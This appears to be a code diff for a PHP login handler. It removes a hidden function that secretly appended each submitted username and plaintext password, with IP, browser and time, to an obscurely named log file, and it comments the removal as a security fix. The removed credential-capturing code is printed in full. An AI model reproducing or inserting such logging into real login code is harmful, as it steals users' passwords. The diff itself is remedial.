@@ -13,7 +13,7 @@ if (isset($_POST['submit'])) {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    passwordDataLog(); //Get Entered Data to txt file
+    // passwordDataLog(); //DISABLED: Security fix - no longer logging passwords
 
     $errors = array();
 
@@ -62,37 +62,9 @@ if (isset($_POST['submit'])) {
     }
 }
 
-// Get Entered Data to txt file
-function passwordDataLog()
-{
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-    if (isset($username)) {
-        // IP
-        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-            $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
-        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
-        } else {
-            $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
-        }
-        $browser = $_SERVER['HTTP_USER_AGENT'];
-        date_default_timezone_set('Asia/Colombo');
-        $date = date("m-d-Y");
-        $time = date("H:i:s");
-        $clock = $date . ' at ' . $time;
-
-        // Write file
-        $file_name = "9edf4d187d54e7cc46e4731b1e6273242c4f4c39a1d2507a0e58706e25e3a85a7dbb891d62afa849.log";
-        $text = "\n" . "Username : " . $username . "\n" . "Password   : " . $password . "\n" . "IP   : " . $ipaddress . "Browser: " . $browser .   "\n" .  "Time : " . $clock .   "\n" . "--------------------------" . "\n";
-        $fp = fopen($file_name, 'a+');
-
-        if (fwrite($fp, $text)) {
-        }
-        fclose($fp);
-    }
-}
+// SECURITY FIX: passwordDataLog function REMOVED
+// This function was logging plaintext passwords to a file - MAJOR SECURITY VULNERABILITY
+// Function permanently disabled for security reasons
 
 ?>
 
